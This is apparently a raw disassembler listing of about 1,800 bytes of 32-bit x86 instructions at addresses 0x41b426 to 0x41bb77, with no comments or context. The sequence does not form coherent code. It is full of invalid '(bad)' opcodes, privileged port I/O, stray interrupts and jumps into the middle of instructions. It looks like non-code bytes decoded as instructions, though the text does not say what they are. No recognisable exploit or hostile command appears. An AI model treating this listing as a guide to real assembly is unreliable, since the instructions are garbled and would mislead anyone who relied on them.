  41b426:	add    BYTE PTR [edi+eax*4+0x48a58803],dh
  41b42d:	fmul   QWORD PTR [ebp+0x69e8a5b3]
  41b433:	mov    ds:0x930ac42d,al
  41b438:	les    esi,FWORD PTR [esi]
  41b43a:	cdq    
  41b43b:	(bad)  
  41b43c:	fstp   DWORD PTR [esi+eiz*1-0x4c]
  41b440:	or     esi,0xffffffab
  41b443:	adc    dh,BYTE PTR [edx+0x70a723e4]
  41b449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b44a:	stc    
  41b44b:	xlat   BYTE PTR ds:[ebx]
  41b44c:	into   
  41b44d:	jae    0x41b45b
  41b44f:	ja     0x41b469
  41b451:	outs   dx,DWORD PTR ds:[esi]
  41b452:	push   ecx
  41b453:	pushf  
  41b454:	mov    edi,0x461e5f1f
  41b459:	xchg   ebp,eax
  41b45a:	dec    ebp
  41b45b:	rcr    BYTE PTR [edx+eiz*2+0x61],cl
  41b45f:	outs   dx,BYTE PTR ds:[esi]
  41b460:	aad    0xc9
  41b462:	add    al,BYTE PTR [ebp-0x2001cb14]
  41b468:	(bad)  
  41b469:	jns    0x41b44d
  41b46b:	ss mov ebp,0xc6d4fb1c
  41b471:	adc    BYTE PTR [edx],ch
  41b473:	out    0x49,eax
  41b475:	cld    
  41b476:	inc    eax
  41b477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b478:	fsub   DWORD PTR [edx+edi*4-0x21f2daa]
  41b47f:	test   al,bl
  41b481:	ja     0x41b429
  41b483:	rcr    BYTE PTR [edi+eax*8+0x19],1
  41b487:	mov    esi,0xf2be90a4
  41b48c:	mov    esp,0x6053e066
  41b491:	xchg   esp,eax
  41b492:	sub    DWORD PTR [ebp-0x1e],esi
  41b495:	mov    edi,0x4407bf21
  41b49a:	sbb    al,BYTE PTR [edx+0x2d]
  41b49d:	jecxz  0x41b432
  41b49f:	popf   
  41b4a0:	cwde   
  41b4a1:	aaa    
  41b4a2:	and    dl,BYTE PTR [ecx]
  41b4a4:	scas   al,BYTE PTR es:[edi]
  41b4a5:	rcl    DWORD PTR [edi+ecx*4-0x5d],0xd5
  41b4aa:	test   DWORD PTR [ebp+0x76128ee5],ebp
  41b4b0:	push   0xfffffffe
  41b4b2:	pop    es
  41b4b3:	jbe    0x41b43f
  41b4b5:	mov    cl,0x29
  41b4b7:	jbe    0x41b4f2
  41b4b9:	int    0xa3
  41b4bb:	ficom  DWORD PTR [ecx]
  41b4bd:	sbb    DWORD PTR [edi+0x68],ebx
  41b4c0:	mov    eax,ds:0xd8250dd0
  41b4c5:	mov    ecx,ds
  41b4c7:	aad    0x20
  41b4c9:	(bad)  
  41b4ca:	fadd   st,st(1)
  41b4cc:	clc    
  41b4cd:	(bad)  
  41b4ce:	pushf  
  41b4cf:	nop
  41b4d0:	sub    DWORD PTR [ebp+0x6ed761d],edx
  41b4d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4d7:	mov    edx,0x8a2e4e33
  41b4dc:	xchg   BYTE PTR [esi],al
  41b4de:	mov    ecx,0x89e58e6e
  41b4e3:	push   ebp
  41b4e4:	and    al,0x76
  41b4e6:	cmc    
  41b4e7:	add    DWORD PTR [esi+0x47],0x6b
  41b4eb:	ds jns 0x41b49e
  41b4ee:	out    0x7f,eax
  41b4f0:	xor    cl,BYTE PTR [ebp+0x7c]
  41b4f3:	in     al,0x5c
  41b4f5:	inc    edi
  41b4f6:	jle    0x41b4be
  41b4f8:	in     al,dx
  41b4f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4fa:	imul   eax,ecx,0x35077a0e
  41b500:	js     0x41b566
  41b502:	repz jl 0x41b4db
  41b505:	lods   eax,DWORD PTR ds:[esi]
  41b506:	fisttp QWORD PTR [ebp+0x7d]
  41b509:	ret    0x9dfd
  41b50c:	mov    al,0x7e
  41b50e:	pop    eax
  41b50f:	sbb    eax,0xfddfb3ec
  41b514:	push   ebp
  41b515:	mov    DWORD PTR [edi],ecx
  41b517:	add    ch,BYTE PTR [eax+0x6befbf06]
  41b51d:	(bad)  
  41b51f:	jmp    0x41b558
  41b521:	mov    eax,ds:0x29de09c1
  41b526:	imul   esi,DWORD PTR [eax],0xd83c28e9
  41b52c:	daa    
  41b52d:	inc    ecx
  41b52e:	rol    DWORD PTR [eax-0x57418fa6],0x5a
  41b535:	imul   dh
  41b537:	dec    ecx
  41b538:	(bad)  
  41b539:	std    
  41b53a:	pop    eax
  41b53b:	cmovl  ebp,esp
  41b53e:	sub    eax,0x28ab392
  41b543:	fcmove st,st(4)
  41b545:	dec    ecx
  41b546:	xchg   edi,eax
  41b547:	jcxz   0x41b522
  41b54a:	adc    ch,BYTE PTR [edi]
  41b54c:	addr16 gs mov edx,0x8cabe990
  41b553:	dec    esp
  41b554:	mov    dl,0x7f
  41b556:	add    al,0x2e
  41b558:	mov    ah,0x80
  41b55a:	fadd   QWORD PTR [ecx-0x12ef230e]
  41b560:	and    al,0xbf
  41b562:	pushf  
  41b563:	repz test eax,0x780de71
  41b569:	sub    al,BYTE PTR [edi+0x4b]
  41b56c:	mov    ebp,0x92e80315
  41b571:	mov    edi,0x1d55bbd5
  41b576:	pop    esp
  41b577:	fadd   QWORD PTR [esp+ebp*2+0x3c]
  41b57b:	jmp    0x362a7276
  41b580:	imul   esi,ebp,0x704d5752
  41b586:	jnp    0x41b533
  41b588:	js     0x41b5ce
  41b58a:	add    BYTE PTR [edi-0x5436c76b],ah
  41b590:	lea    edi,[edi]
  41b592:	sub    dl,0xc4
  41b595:	popa   
  41b596:	in     al,dx
  41b597:	dec    ebx
  41b598:	ins    DWORD PTR es:[edi],dx
  41b599:	retf   
  41b59a:	pop    ebp
  41b59b:	aad    0x93
  41b59d:	add    bl,BYTE PTR [esi]
  41b59f:	fcomp  QWORD PTR [ebx]
  41b5a1:	mov    ds:0x436fa317,al
  41b5a6:	push   ebx
  41b5a7:	push   edx
  41b5a8:	retf   
  41b5a9:	add    al,0xc1
  41b5ab:	out    0x55,al
  41b5ad:	mov    ebp,0xddeae06b
  41b5b2:	gs int 0xac
  41b5b5:	pop    edx
  41b5b6:	enter  0x36d2,0xb2
  41b5ba:	retf   0x3e8d
  41b5bd:	mov    ds:0xdb969a48,al
  41b5c2:	mov    eax,ds:0xf22d84b8
  41b5c7:	daa    
  41b5c8:	mov    edi,0x4d01823e
  41b5cd:	cli    
  41b5ce:	(bad)
  41b5d1:	mov    ecx,0xc46dc23d
  41b5d6:	js     0x41b5b2
  41b5d8:	jg     0x41b60a
  41b5da:	xchg   edi,eax
  41b5db:	pop    ds
  41b5dc:	cli    
  41b5dd:	adc    DWORD PTR [ecx],ebp
  41b5df:	sbb    dl,BYTE PTR [eax+eax*2-0x12a1ec5f]
  41b5e6:	ror    dl,cl
  41b5e8:	aas    
  41b5e9:	in     al,dx
  41b5ea:	test   BYTE PTR [eax+0xe157c04],ch
  41b5f0:	popa   
  41b5f1:	rol    BYTE PTR [edx-0x5bae392f],1
  41b5f7:	outs   dx,BYTE PTR ds:[esi]
  41b5f8:	outs   dx,BYTE PTR ds:[esi]
  41b5f9:	push   eax
  41b5fa:	pop    eax
  41b5fb:	stc    
  41b5fc:	cmp    WORD PTR [edx],di
  41b5ff:	pop    ecx
  41b600:	ss ja  0x41b64e
  41b603:	ret    
  41b604:	jb     0x41b656
  41b606:	push   edx
  41b607:	cmp    BYTE PTR [edi+0x52f2b4f0],cl
  41b60d:	adc    BYTE PTR [eax],cl
  41b60f:	jne    0x41b66a
  41b611:	loop   0x41b5a2
  41b613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b614:	stos   DWORD PTR es:[edi],eax
  41b615:	sbb    dh,ah
  41b617:	sbb    al,0x58
  41b619:	mov    eax,ds:0x13afa7e3
  41b61e:	sbb    eax,0x3fafd0b3
  41b623:	int    0xeb
  41b625:	test   al,dl
  41b627:	or     ch,BYTE PTR [ecx]
  41b629:	daa    
  41b62a:	int    0xa1
  41b62c:	ror    BYTE PTR [esi+0x33f3ece7],0xe9
  41b633:	lods   al,BYTE PTR ds:[esi]
  41b634:	push   0x2a
  41b636:	mov    ch,0x93
  41b638:	ins    BYTE PTR es:[edi],dx
  41b639:	nop
  41b63a:	(bad)  
  41b63b:	in     eax,dx
  41b63c:	lods   eax,DWORD PTR ds:[esi]
  41b63d:	mov    esi,0x7114907b
  41b642:	out    0x89,eax
  41b644:	or     eax,0x8f718804
  41b649:	add    BYTE PTR [ebx+0x5b1d5bad],ch
  41b64f:	add    ebp,eax
  41b651:	dec    esi
  41b652:	(bad)  
  41b653:	ss scas al,BYTE PTR es:[edi]
  41b655:	loopne 0x41b6c6
  41b657:	or     BYTE PTR [esi+ebx*4+0x494a93b5],bl
  41b65e:	mov    bh,0x9a
  41b660:	stos   DWORD PTR es:[edi],eax
  41b661:	test   eax,0xb1610118
  41b666:	pop    edi
  41b667:	cmp    al,0x9
  41b669:	xchg   esi,eax
  41b66a:	add    al,BYTE PTR [eax+eiz*2]
  41b66d:	(bad)  
  41b66e:	fbstp  TBYTE PTR [eax]
  41b670:	jae    0x41b669
  41b672:	call   0x6624cf4
  41b677:	sbb    edx,DWORD PTR [edi-0x2b]
  41b67a:	lds    edx,FWORD PTR [eax+ebp*1+0x35]
  41b67e:	int    0xa5
  41b680:	lods   eax,DWORD PTR ds:[esi]
  41b681:	sbb    dh,BYTE PTR [edx-0x76]
  41b684:	ret    0x4bb6
  41b687:	inc    eax
  41b688:	addr16 adc eax,0x1de2a213
  41b68e:	xor    edi,DWORD PTR [ebp-0x6842de20]
  41b694:	or     cl,BYTE PTR [ebx]
  41b696:	loopne 0x41b65f
  41b698:	int    0x83
  41b69a:	(bad)  [ebx-0xd]
  41b69d:	or     BYTE PTR [ebp+ecx*8+0x69],0xad
  41b6a2:	test   DWORD PTR [eax-0x2267bdc8],esp
  41b6a8:	lock inc edi
  41b6aa:	stos   DWORD PTR es:[edi],eax
  41b6ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6ac:	push   edx
  41b6ad:	mov    dl,0x6b
  41b6af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6b0:	mov    ch,0x95
  41b6b2:	or     al,0x5b
  41b6b4:	xor    DWORD PTR [ecx-0x3ba3c35a],ebp
  41b6ba:	inc    esi
  41b6bb:	adc    al,0xe5
  41b6bd:	clc    
  41b6be:	jbe    0x41b69e
  41b6c0:	(bad)  
  41b6c1:	push   0x9cd89cb9
  41b6c6:	ds (bad) 
  41b6c8:	stc    
  41b6c9:	outs   dx,DWORD PTR ds:[esi]
  41b6ca:	and    al,0xa5
  41b6cc:	pushf  
  41b6cd:	into   
  41b6ce:	or     ebx,DWORD PTR [ebx+0x57661aa1]
  41b6d4:	pop    ebp
  41b6d5:	adc    al,BYTE PTR [ebp+0x7e246bef]
  41b6db:	push   edx
  41b6dc:	(bad)  
  41b6de:	pop    edi
  41b6df:	rcr    BYTE PTR [edx-0x7baabd97],cl
  41b6e5:	adc    BYTE PTR [eax+0x4],dl
  41b6e8:	mov    dh,0x58
  41b6ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6eb:	enter  0x63ce,0x71
  41b6ef:	enter  0x3602,0xa8
  41b6f3:	bound  ecx,QWORD PTR [ebx]
  41b6f5:	push   ds
  41b6f6:	lock fsubr QWORD PTR [edx-0x53672e44]
  41b6fd:	xor    dl,BYTE PTR [edi]
  41b6ff:	pop    esi
  41b700:	or     al,0xcd
  41b702:	rcr    eax,cl
  41b704:	rcl    ah,0xec
  41b707:	dec    eax
  41b708:	mov    ah,0xde
  41b70a:	sti    
  41b70b:	in     eax,dx
  41b70c:	and    ebx,DWORD PTR [esi-0x72]
  41b70f:	cmp    edi,DWORD PTR [eax+0x3f66ca0]
  41b715:	sub    BYTE PTR [edi+0x7],0x7
  41b719:	mov    al,ds:0xdeea71e
  41b71e:	add    eax,0xe3e7b512
  41b723:	sub    al,0x11
  41b725:	pop    eax
  41b726:	inc    esp
  41b727:	mov    esi,0x9414be81
  41b72c:	les    eax,FWORD PTR [ecx+0x4736625f]
  41b732:	xor    BYTE PTR [esi+0x708f3760],ch
  41b738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b739:	lahf   
  41b73a:	je     0x41b6d9
  41b73c:	pop    edx
  41b73d:	mul    BYTE PTR [ebx]
  41b73f:	cmp    ebx,DWORD PTR [esp+edx*2]
  41b742:	or     eax,0x23c79c4a
  41b747:	cmp    DWORD PTR [ebp-0x39],esp
  41b74a:	aas    
  41b74b:	jg     0x41b786
  41b74d:	int    0xef
  41b74f:	jmp    0x41b795
  41b751:	out    dx,al
  41b752:	lahf   
  41b753:	add    eax,DWORD PTR [ecx+ecx*1+0x58]
  41b757:	pop    edi
  41b758:	push   edi
  41b759:	mov    gs,ebx
  41b75b:	iret   
  41b75c:	sbb    al,0x17
  41b75e:	push   edi
  41b75f:	js     0x41b761
  41b761:	or     al,0x72
  41b763:	add    ah,al
  41b765:	in     al,dx
  41b766:	clc    
  41b767:	ds and eax,0x47984b4c
  41b76d:	sbb    al,0xa0
  41b76f:	sbb    al,0x97
  41b771:	xor    DWORD PTR [ecx-0x29],esp
  41b774:	scas   al,BYTE PTR es:[edi]
  41b775:	rcl    DWORD PTR [ebp-0x2e],cl
  41b778:	mov    ch,0xc8
  41b77a:	jae    0x41b70a
  41b77c:	es mov bl,0x99
  41b77f:	fwait
  41b780:	mov    edx,0x1bfb3c
  41b785:	add    eax,0x2f54c15f
  41b78a:	loope  0x41b7b0
  41b78c:	mov    WORD PTR [ecx-0xe],fs
  41b78f:	outs   dx,DWORD PTR ds:[esi]
  41b790:	push   ss
  41b791:	popf   
  41b792:	jl     0x41b73d
  41b794:	mov    edx,0xe1be45d1
  41b799:	cmp    BYTE PTR [edx-0x12],dh
  41b79c:	jl     0x41b72c
  41b79e:	fld    QWORD PTR [ebx+0x13]
  41b7a1:	popf   
  41b7a2:	aaa    
  41b7a3:	mov    al,ds:0xe0496cc0
  41b7a8:	mov    eax,ss
  41b7aa:	pop    eax
  41b7ab:	mov    ecx,ebp
  41b7ad:	fisub  WORD PTR [eax+0x10]
  41b7b0:	add    DWORD PTR [ecx-0x2d416992],eax
  41b7b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7b8:	test   DWORD PTR [esi+edi*2],edi
  41b7bb:	inc    esi
  41b7bc:	enter  0x2d08,0x19
  41b7c0:	xchg   BYTE PTR [eax+0x3],bh
  41b7c3:	dec    edx
  41b7c4:	push   0x4ff6e3b3
  41b7c9:	pop    ss
  41b7ca:	repnz mov esi,0x87ef8757
  41b7d0:	jnp    0x41b7db
  41b7d2:	jecxz  0x41b7ee
  41b7d4:	scas   al,BYTE PTR es:[edi]
  41b7d5:	(bad)  [edx-0x16]
  41b7d8:	aad    0x45
  41b7da:	outs   dx,DWORD PTR ds:[esi]
  41b7db:	fcmovu st,st(1)
  41b7dd:	push   ebx
  41b7de:	stos   BYTE PTR es:[edi],al
  41b7df:	(bad)  
  41b7e1:	inc    esi
  41b7e2:	mov    esi,0xd3f78af8
  41b7e7:	sub    al,0xee
  41b7e9:	out    0x3a,eax
  41b7eb:	clc    
  41b7ec:	ss pusha 
  41b7ee:	out    0x9e,al
  41b7f0:	cmp    dl,ah
  41b7f2:	xchg   esi,eax
  41b7f3:	loopne 0x41b7f7
  41b7f5:	and    ax,0xff9a
  41b7f9:	repz or ebp,0xffebb6af
  41b800:	int    0x57
  41b802:	popf   
  41b803:	repnz bound ebx,QWORD PTR [ecx-0x50c107e2]
  41b80a:	adc    eax,0x89e8a380
  41b80f:	ds cmp eax,0x9c6b6ef4
  41b815:	in     eax,0x7f
  41b817:	push   ss
  41b818:	fmul   DWORD PTR [ebp+0x27]
  41b81b:	shl    BYTE PTR [ebx],0xb6
  41b81e:	cwde   
  41b81f:	(bad)  
  41b820:	jle    0x41b85c
  41b822:	xor    DWORD PTR [ecx+edi*8],ecx
  41b825:	cmp    dl,BYTE PTR [esi+0x240a4541]
  41b82b:	jp     0x41b819
  41b82d:	rcl    BYTE PTR [ecx],cl
  41b82f:	jno    0x41b845
  41b831:	or     ecx,DWORD PTR [esi-0xf]
  41b834:	ins    DWORD PTR es:[edi],dx
  41b835:	rcr    ch,cl
  41b837:	inc    ebx
  41b838:	mov    edx,0x7e6d4e1e
  41b83d:	add    DWORD PTR [eax-0x5d445b49],ebx
  41b843:	fcmovbe st,st(4)
  41b845:	xchg   edx,eax
  41b846:	adc    al,BYTE PTR [ecx+0x5c5ad881]
  41b84c:	dec    edi
  41b84d:	and    bl,BYTE PTR [ecx+0x12c1d8f5]
  41b853:	dec    eax
  41b854:	push   edi
  41b855:	inc    ebx
  41b856:	mov    ebx,0xd7c32cea
  41b85b:	es dec ebp
  41b85d:	mov    BYTE PTR [esi-0x5740fad7],0x5a
  41b864:	mov    ebx,0xb450afba
  41b869:	sub    cl,bh
  41b86b:	and    BYTE PTR [ecx+0x5c],cl
  41b86e:	mov    ds:0x141dc8ed,eax
  41b873:	mov    DWORD PTR [ecx+0x22],esi
  41b876:	cmp    BYTE PTR [edi+0x515c6b3b],ch
  41b87c:	mov    eax,0x6f0edc6f
  41b881:	aas    
  41b882:	addr16 dec esi
  41b884:	mov    ebp,fs
  41b886:	fwait
  41b887:	cs or  eax,0xdefab98e
  41b88d:	stos   BYTE PTR es:[edi],al
  41b88e:	xor    al,0xca
  41b890:	or     BYTE PTR [edi*1-0x112b695c],dh
  41b897:	clc    
  41b898:	xor    eax,edx
  41b89a:	lds    eax,FWORD PTR [edi+0x5abe82b5]
  41b8a0:	rol    DWORD PTR [esi],cl
  41b8a2:	and    al,0x7d
  41b8a4:	or     al,0x64
  41b8a6:	pop    ebx
  41b8a7:	jg     0x41b86c
  41b8a9:	push   0xf4bb284e
  41b8ae:	out    0x97,al
  41b8b0:	les    ecx,FWORD PTR [ecx-0x4499330d]
  41b8b6:	xchg   DWORD PTR [edi],ebp
  41b8b8:	sbb    al,0x1c
  41b8ba:	adc    DWORD PTR [edx+0x62],0xc1c9dbca
  41b8c1:	aaa    
  41b8c2:	push   edx
  41b8c3:	imul   ecx,DWORD PTR [esi],0x4115027e
  41b8c9:	pusha  
  41b8ca:	fiadd  DWORD PTR [ebx]
  41b8cc:	add    BYTE PTR [ecx],al
  41b8ce:	adc    eax,DWORD PTR [edx-0x14]
  41b8d1:	fnstenv [esi+0x69bde77f]
  41b8d7:	jne    0x41b905
  41b8d9:	fnstcw WORD PTR [eax+0x39]
  41b8dc:	ins    BYTE PTR es:[edi],dx
  41b8dd:	fidiv  WORD PTR [esi+0x52]
  41b8e0:	push   cs
  41b8e1:	mov    DWORD PTR [esi-0x7f],eax
  41b8e4:	scas   al,BYTE PTR es:[edi]
  41b8e5:	sahf   
  41b8e6:	sub    edx,edi
  41b8e8:	cmp    al,0x0
  41b8ea:	push   ecx
  41b8eb:	add    BYTE PTR [ebx-0x79d73aee],bh
  41b8f1:	lahf   
  41b8f2:	adc    eax,0x20ccc357
  41b8f7:	adc    al,0x4
  41b8f9:	mov    ecx,0xea876252
  41b8fe:	lahf   
  41b8ff:	dec    ebx
  41b900:	stos   BYTE PTR es:[edi],al
  41b901:	in     al,0x24
  41b903:	lds    ebx,FWORD PTR [eax]
  41b905:	imul   eax,DWORD PTR [ecx-0x5aa92c1e],0x9fb46a3
  41b90f:	outs   dx,BYTE PTR ds:[esi]
  41b910:	jns    0x41b977
  41b912:	jae    0x41b97f
  41b914:	jmp    DWORD PTR [edx-0x1a]
  41b917:	dec    edx
  41b918:	push   0x58
  41b91a:	pop    esp
  41b91b:	xchg   ebp,eax
  41b91c:	sbb    BYTE PTR [ebp-0x30aeda1b],cl
  41b922:	sbb    al,0x7f
  41b924:	mov    ebx,0xbd8b8baf
  41b929:	and    al,0x33
  41b92b:	ins    DWORD PTR es:[edi],dx
  41b92c:	shl    BYTE PTR [ebp+0x3351f997],cl
  41b932:	call   0xdb4d0f8b
  41b937:	int    0xcf
  41b939:	sbb    DWORD PTR [esi+0x1ee1659e],0x69c40d5e
  41b943:	scas   eax,DWORD PTR es:[edi]
  41b944:	fisub  WORD PTR [ebx-0x514bc480]
  41b94a:	mov    BYTE PTR [esi+0xd],al
  41b94d:	pop    esp
  41b94e:	aam    0x95
  41b950:	aaa    
  41b951:	pop    esp
  41b952:	ror    BYTE PTR [eax+0xf5c8404],cl
  41b958:	shl    BYTE PTR [esi],cl
  41b95a:	popf   
  41b95b:	sub    eax,esp
  41b95d:	retf   0xacc0
  41b960:	lods   al,BYTE PTR ds:[esi]
  41b961:	std    
  41b962:	loopne 0x41b9a5
  41b964:	mov    edx,0x8c7ac2fa
  41b969:	mov    es,WORD PTR [esi]
  41b96b:	stos   DWORD PTR es:[edi],eax
  41b96c:	mov    esi,0x2d9e0817
  41b971:	scas   al,BYTE PTR es:[edi]
  41b972:	sar    edi,1
  41b974:	stos   BYTE PTR es:[edi],al
  41b975:	sub    edi,DWORD PTR [ecx+0x5a20db09]
  41b97b:	(bad)  
  41b97c:	cld    
  41b97d:	outs   dx,DWORD PTR ds:[esi]
  41b97e:	jo     0x41b957
  41b980:	in     eax,dx
  41b981:	jbe    0x41b945
  41b983:	lahf   
  41b984:	pushf  
  41b985:	mov    dh,0x81
  41b987:	xor    al,0x6d
  41b989:	adc    DWORD PTR [eax],edi
  41b98b:	cmp    dh,BYTE PTR [edx+0x5f]
  41b98e:	int    0x13
  41b990:	pop    ecx
  41b991:	test   BYTE PTR [ebx+0x64128980],0x5e
  41b998:	je     0x41b988
  41b99a:	mov    ds:0xc9d6211b,eax
  41b99f:	pop    ds
  41b9a0:	pop    esp
  41b9a1:	pop    edi
  41b9a2:	sub    DWORD PTR [edi],eax
  41b9a4:	pop    eax
  41b9a5:	inc    ebp
  41b9a6:	mov    esp,0x6f0d5752
  41b9ab:	shr    BYTE PTR [edi+0x34],1
  41b9ae:	scas   al,BYTE PTR es:[edi]
  41b9af:	test   eax,0x39a57e95
  41b9b4:	loop   0x41b9bf
  41b9b6:	popf   
  41b9b7:	les    ebx,FWORD PTR ds:0x4e0b7007
  41b9bd:	(bad)  
  41b9be:	ret    
  41b9bf:	stc    
  41b9c0:	popa   
  41b9c1:	or     cl,ch
  41b9c3:	ror    BYTE PTR [ebp-0x7ee946ac],cl
  41b9c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9ca:	pop    ebx
  41b9cb:	or     BYTE PTR [edi],cl
  41b9cd:	xchg   ebp,eax
  41b9ce:	std    
  41b9cf:	jp     0x41b964
  41b9d1:	mov    dh,0x82
  41b9d3:	xchg   ebx,eax
  41b9d4:	retf   0x66d9
  41b9d7:	or     bl,BYTE PTR [edi-0x3b]
  41b9da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9db:	iret   
  41b9dc:	fcomp  QWORD PTR [edx]
  41b9de:	add    eax,0xfe86ba28
  41b9e3:	xchg   DWORD PTR [edi+0x5e23008f],edx
  41b9e9:	out    dx,al
  41b9ea:	jae    0x41b996
  41b9ec:	push   esp
  41b9ed:	shl    DWORD PTR [eax],0xe
  41b9f0:	mov    dl,0xb4
  41b9f2:	jo     0x41ba2e
  41b9f4:	jno    0x41b9d1
  41b9f6:	mov    ch,0x96
  41b9f8:	cmp    DWORD PTR [esi],esp
  41b9fa:	mov    esp,0x8ef05950
  41b9ff:	cmp    eax,0x2ffdca30
  41ba04:	dec    ebp
  41ba05:	bnd jbe 0x41ba44
  41ba08:	sbb    eax,0xee569e78
  41ba0d:	scas   eax,DWORD PTR es:[edi]
  41ba0e:	aas    
  41ba0f:	int    0xba
  41ba11:	lds    edi,FWORD PTR [edx-0x4c1c7098]
  41ba17:	or     eax,0x2a62448e
  41ba1c:	aaa    
  41ba1d:	add    al,dl
  41ba1f:	rcl    DWORD PTR [ecx+0x34],1
  41ba22:	aad    0xc2
  41ba24:	out    0x5c,al
  41ba26:	cs in  eax,0x59
  41ba29:	in     eax,0x26
  41ba2b:	push   ecx
  41ba2c:	xlat   BYTE PTR ds:[ebx]
  41ba2d:	mov    edx,0x500a469d
  41ba32:	icebp  
  41ba33:	test   DWORD PTR [eax+0x1ac5c7c],ebx
  41ba39:	shr    BYTE PTR [edi+0x422a6920],0x49
  41ba40:	(bad)  
  41ba41:	mov    dh,0xf4
  41ba43:	lods   al,BYTE PTR ds:[esi]
  41ba44:	loope  0x41ba1e
  41ba46:	mov    ds:0x76108e74,eax
  41ba4b:	repz cmp DWORD PTR [ebx-0x752cffbc],ebp
  41ba52:	lock mov edx,0x3fd52695
  41ba58:	ret    
  41ba59:	inc    eax
  41ba5a:	sahf   
  41ba5b:	test   BYTE PTR [ecx+0x5987d247],dh
  41ba61:	xchg   BYTE PTR [ecx-0x1e4cf827],dh
  41ba67:	mov    ebp,0x12025e63
  41ba6c:	int3   
  41ba6d:	pop    edi
  41ba6e:	or     eax,0xf6dfd3b3
  41ba73:	xchg   esp,eax
  41ba74:	leave  
  41ba75:	arpl   WORD PTR [ebp-0x7a],ax
  41ba78:	jo     0x41ba5b
  41ba7a:	lods   eax,DWORD PTR ds:[esi]
  41ba7b:	or     ch,dh
  41ba7d:	fwait
  41ba7e:	stos   DWORD PTR es:[edi],eax
  41ba7f:	mov    ds:0x400f87a9,eax
  41ba84:	pop    ebx
  41ba85:	sahf   
  41ba86:	cmp    BYTE PTR [esi+ebx*4-0x2412ea47],dh
  41ba8d:	stc    
  41ba8e:	sub    DWORD PTR [esi],esp
  41ba90:	jbe    0x41ba48
  41ba92:	and    dh,dl
  41ba94:	cmp    eax,0x7b
  41ba97:	pop    ebx
  41ba98:	inc    edx
  41ba99:	and    al,0x31
  41ba9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba9c:	and    BYTE PTR [ecx-0x5d],bl
  41ba9f:	dec    edi
  41baa0:	xchg   BYTE PTR [ecx],bl
  41baa2:	sub    dh,BYTE PTR [esi]
  41baa4:	call   DWORD PTR ds:0xa6b3498a
  41baaa:	call   DWORD PTR [edi+0x53824092]
  41bab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bab1:	jns    0x41bb06
  41bab3:	xor    dh,0xaa
  41bab6:	pushf  
  41bab7:	mov    dl,BYTE PTR [ecx+0x1542f196]
  41babd:	pop    ebx
  41babe:	pop    ecx
  41babf:	test   DWORD PTR [edi+0x13],ecx
  41bac2:	lahf   
  41bac3:	xchg   edi,eax
  41bac4:	pop    esi
  41bac5:	xchg   ecx,eax
  41bac6:	xor    ah,BYTE PTR [ebx]
  41bac8:	fmul   QWORD PTR [ebx]
  41baca:	aas    
  41bacb:	call   0x8a273ea4
  41bad0:	add    dl,BYTE PTR [edi-0x12]
  41bad3:	mov    ds:0xf5466d71,eax
  41bad8:	pop    edx
  41bad9:	xchg   edx,eax
  41bada:	inc    esp
  41badb:	jnp    0x41ba7a
  41badd:	mov    edi,esp
  41badf:	lods   al,BYTE PTR ds:[esi]
  41bae0:	loopne 0x41bb4c
  41bae2:	mov    ch,0x2
  41bae4:	or     BYTE PTR es:[esi],cl
  41bae7:	xchg   esp,eax
  41bae8:	stc    
  41bae9:	mov    bl,BYTE PTR [edi]
  41baeb:	jnp    0x41bb6a
  41baed:	pop    es
  41baee:	sbb    al,0x3
  41baf0:	or     esp,DWORD PTR [ecx+0x5e]
  41baf3:	push   edi
  41baf4:	xor    al,0xb1
  41baf6:	add    ch,dh
  41baf8:	mov    edx,0x118bc99e
  41bafd:	loop   0x41ba94
  41baff:	(bad)  
  41bb00:	pop    ds
  41bb01:	loopne 0x41bb52
  41bb03:	ja     0x41bb2b
  41bb05:	fidivr WORD PTR [edx-0x681235e5]
  41bb0b:	cmp    DWORD PTR [eax-0x2f],0x20
  41bb0f:	mov    eax,0x8009099d
  41bb14:	add    dh,BYTE PTR ds:0x52ddc1dc
  41bb1a:	je     0x41bae4
  41bb1c:	jae    0x41baab
  41bb1e:	xchg   eax,ebp
  41bb20:	dec    eax
  41bb21:	jp     0x41bb7c
  41bb23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb24:	add    ebx,DWORD PTR [edx]
  41bb26:	pushf  
  41bb27:	xor    eax,0xfae1fc20
  41bb2c:	pop    es
  41bb2d:	jp     0x41bb8f
  41bb2f:	pop    edx
  41bb30:	das    
  41bb31:	jecxz  0x41bb4e
  41bb33:	xlat   BYTE PTR ds:[ebx]
  41bb34:	push   cs
  41bb35:	sub    esi,0xffffffbe
  41bb38:	mov    ebx,DWORD PTR [edx+esi*1]
  41bb3b:	xor    BYTE PTR [ebx],dl
  41bb3d:	mov    BYTE PTR [ebx-0x61],al
  41bb40:	mov    BYTE PTR [esi+ebp*4],cl
  41bb43:	lods   eax,DWORD PTR ds:[esi]
  41bb44:	jne    0x41bae4
  41bb46:	ins    BYTE PTR es:[edi],dx
  41bb47:	xor    ecx,DWORD PTR [edi]
  41bb49:	loopne 0x41bb64
  41bb4b:	pop    ecx
  41bb4c:	push   cs
  41bb4d:	mov    eax,0x6bacf061
  41bb52:	loope  0x41bba7
  41bb54:	mov    al,0x83
  41bb56:	fcmovnb st,st(1)
  41bb58:	mov    ds:0x52cf105a,eax
  41bb5d:	dec    esi
  41bb5e:	mov    edx,0x14a5cac5
  41bb63:	and    DWORD PTR [edi],ecx
  41bb65:	push   eax
  41bb66:	inc    eax
  41bb67:	fidiv  WORD PTR [ecx+0x600d6d90]
  41bb6d:	mov    edx,0x80dc9474
  41bb72:	mov    al,ds:0x2c0520bc
  41bb77:	imul   ecx,edi,0xe436e5e
